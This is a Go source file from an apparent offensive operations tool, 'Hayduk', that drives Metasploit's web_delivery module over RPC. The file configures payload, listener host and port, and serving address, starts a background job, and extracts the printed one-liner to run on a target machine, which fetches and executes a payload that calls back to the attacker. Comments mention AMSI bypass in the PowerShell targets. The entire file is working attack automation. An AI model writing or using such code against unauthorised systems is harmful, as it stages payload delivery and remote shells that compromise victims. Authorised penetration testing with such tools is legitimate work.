package engine

import (
	"context"
	"encoding/json"
	"fmt"
	"regexp"
	"strconv"
	"strings"

	"github.com/jolovicdev/go-msf/v2"
	"github.com/jolovicdev/hayduk/internal/protocol"
)

// webDeliveryTargets maps the launcher platforms Hayduk offers onto the
// module's target indices (exploit/multi/script/web_delivery).
var webDeliveryTargets = map[string]int{
	"python":   0,
	"php":      1,
	"psh":      2,
	"regsvr32": 3,
	"linux":    7,
	"osx":      8,
}

var (
	webDeliveryJobRe = regexp.MustCompile(`background job (\d+)`)
	webDeliveryURLRe = regexp.MustCompile(`Using URL: (\S+)`)
)

// webDelivery starts the script delivery server as a background job through
// a utility console and captures the one-liner the module itself prints.
// Templating that launcher here would drift from the framework (the PSH
// targets carry AMSI bypass and encoded-command machinery); the module's own
// output is the source of truth for every installed version.
func (e *Engine) webDelivery(ctx context.Context, rpc gomsf.RPCCaller, operator, ws string, p protocol.WebDeliveryParams) (json.RawMessage, *protocol.ErrorBody) {
	target, ok := webDeliveryTargets[strings.ToLower(strings.TrimSpace(p.Target))]
	if !ok {
		return nil, badParam("target must be python, php, psh, regsvr32, linux, or osx")
	}
	if p.Payload == "" || strings.ContainsAny(p.Payload, " \t\r\n") {
		return nil, badParam("invalid payload name")
	}
	lhost := strings.TrimSpace(p.Lhost)
	if lhost == "" || strings.ContainsAny(lhost, "\r\n") {
		return nil, badParam("lhost is required")
	}
	if !validPort(p.Lport) {
		return nil, badParam("lport must be between 1 and 65535")
	}
	srvPort := p.SrvPort
	if srvPort == 0 {
		srvPort = 8080
	}
	if !validPort(srvPort) {
		return nil, badParam("srvPort must be between 1 and 65535")
	}
	srvHost := strings.TrimSpace(p.SrvHost)
	if srvHost == "" {
		srvHost = lhost
	}
	if strings.ContainsAny(srvHost, "\r\n") {
		return nil, badParam("invalid srvHost")
	}
	uriPath := randomName()
	lines := []string{
		"use exploit/multi/script/web_delivery",
		"set PAYLOAD " + p.Payload,
		"set LHOST " + consoleArg(lhost),
		fmt.Sprintf("set LPORT %d", p.Lport),
		// SRVHOST names the address the printed one-liner points at; left at
		// 0.0.0.0 the launcher would carry an address no target can dial.
		"set SRVHOST " + consoleArg(srvHost),
		fmt.Sprintf("set SRVPORT %d", srvPort),
		"set URIPATH " + uriPath,
		fmt.Sprintf("set TARGET %d", target),
		"exploit -j",
	}
	out, err := e.lockedUtilityConsoleUntil(ctx, rpc, lines, webDeliverySettled)
	if err != nil {
		return nil, mapErr(err)
	}
	command := webDeliveryCommand(out)
	if command == "" {
		return nil, &protocol.ErrorBody{Code: protocol.CodeInternal,
			Message: "web delivery produced no launcher command: " + errorLine(out)}
	}
	jobID := 0
	if m := webDeliveryJobRe.FindStringSubmatch(out); m != nil {
		jobID, _ = strconv.Atoi(m[1])
	}
	url := ""
	if m := webDeliveryURLRe.FindStringSubmatch(out); m != nil {
		url = m[1]
	}
	e.registerListener(operator, jobID, p.Payload, map[string]interface{}{"LHOST": lhost, "LPORT": p.Lport})
	e.eventfOpIn(ws, operator, protocol.LevelSuccess, "web delivery (%s) serving %s as job %d", p.Target, url, jobID)
	return mustJSON(protocol.WebDeliveryPayload{JobID: jobID, URL: url, Command: command, Target: p.Target}), nil
}

// webDeliverySettled reports whether the background exploit -j job has printed
// either its complete launcher line or a fatal error.
func webDeliverySettled(out string) bool {
	if hasErrorLine(out) {
		return true
	}
	idx := strings.Index(out, "Run the following command on the target machine")
	if idx < 0 {
		return false
	}
	rest := out[idx:]
	nl := strings.IndexByte(rest, '\n')
	if nl < 0 {
		return false
	}
	// Require a newline after the launcher line so a partial read cannot
	// truncate the command.
	for _, line := range strings.SplitAfter(rest[nl+1:], "\n") {
		if strings.TrimSpace(line) != "" {
			return strings.HasSuffix(line, "\n")
		}
	}
	return false
}

// webDeliveryCommand returns the first non-empty line after the module's
// "Run the following command on the target machine:" banner.
func webDeliveryCommand(out string) string {
	lines := strings.Split(out, "\n")
	for i, line := range lines {
		if !strings.Contains(line, "Run the following command on the target machine") {
			continue
		}
		for _, next := range lines[i+1:] {
			if trimmed := strings.TrimSpace(next); trimmed != "" {
				return trimmed
			}
		}
	}
	return ""
}
